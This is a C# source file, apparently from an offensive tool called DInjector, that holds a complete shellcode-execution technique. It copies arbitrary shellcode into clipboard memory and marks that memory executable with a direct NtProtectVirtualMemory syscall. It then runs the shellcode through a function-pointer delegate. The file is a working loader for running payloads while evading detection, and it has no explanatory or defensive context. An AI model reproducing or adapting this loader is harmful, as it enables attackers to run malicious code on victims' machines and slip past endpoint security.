using System;
using System.Runtime.InteropServices;

using DI = DInvoke;
using static DInvoke.Data.Native;

namespace DInjector
{
    class ClipboardPointer
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void pFunction();

        public static void Execute(byte[] shellcodeBytes)
        {
            var shellcode = shellcodeBytes;

            #region SetClipboardData

            _ = Win32.OpenClipboard(IntPtr.Zero);

            IntPtr clipboardData = Win32.SetClipboardData(
                0x2, // CF_BITMAP
                shellcode);

            _ = Win32.CloseClipboard();

            #endregion

            #region NtProtectVirtualMemory (PAGE_EXECUTE_READ)

            IntPtr hProcess = IntPtr.Zero; // Process.GetCurrentProcess().Handle
            IntPtr baseAddress = clipboardData;
            IntPtr regionSize = (IntPtr)shellcode.Length;
            uint oldProtect = 0;

            var ntstatus = Syscalls.NtProtectVirtualMemory(
                hProcess,
                ref baseAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
                ref oldProtect);

            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine("(ClipboardPointer) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
            else
                Console.WriteLine($"(ClipboardPointer) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {ntstatus}");

            pFunction f = (pFunction)Marshal.GetDelegateForFunctionPointer(clipboardData, typeof(pFunction));
            f();

            #endregion
        }
    }
}
